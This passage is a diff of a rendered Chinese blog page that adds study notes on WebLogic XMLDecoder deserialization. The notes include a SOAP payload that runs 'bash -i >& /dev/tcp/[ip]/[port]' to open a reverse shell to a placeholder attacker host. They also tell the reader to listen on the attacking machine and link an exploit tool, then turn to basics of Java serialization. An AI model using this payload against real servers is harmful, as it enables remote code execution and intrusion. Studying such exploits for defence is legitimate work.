class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/[ip]/[port] 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击机上监听对应端口即可</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/131381627">漏洞原理</a></p>
+</li>
+</ol>
+</li>
+<li><p>脚本</p>
+<p>  在<a target="_blank" rel="noopener" href="https://github.com/shack2/javaserializetools">这里</a>找到写好的脚本</p>
+<p>  <img src="https://pic.imgdb.cn/item/65802a60c458853aefed1a40.jpg" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>weblogic</code> 反序列化深入</p>
+<ul>
+<li><p><code>java</code> 序列化（与反序列化）</p>
+<ul>
+<li><p>定义</p>
+<p>  把对象的状态信息转换为字节序列，便于存储或传输</p>
+<p>  字节序：多字节数据在内存或网络传输时各字节存储的顺序</p>
+</li>
+<li><p>用途</p>
+<p>  把对象字节序列永久保存到硬盘上，存放在文件里，便于恢复和保存用户会话 <code>Sessions</code></p>
+<p>  便于传输</p>
+<p>  将内存中信息序列化后释放内存，减轻服务器压力，需要时再反序列化至内存中</p>
+</li>
+<li><p>应用场景</p>
+<p>  <code>HTTP</code> 实现多个平台间的通信和管理</p>
+<p>  <code>RMI</code> 完全基于反序列化，<code>java</code> 开发分布式应用程序的 <code>API</code> ，实现不同操作系统程序的方法调用，默认端口 <code>1099</code></p>
+<p>  <code>JMX</code> 可以在任何 <code>java</code> 程序中使用标准的代理服务和管理，</p>
+</li>
+<li><p>实例</p>
+<p>  <code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 实现序列化</p>
+<p>  <code>ObjectInputStream</code> 类的 <code>readObject()</code> 实现反序列化</p>
+</li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -1212,7 +1458,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">87</span>
+          <span class="site-state-item-count">88</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
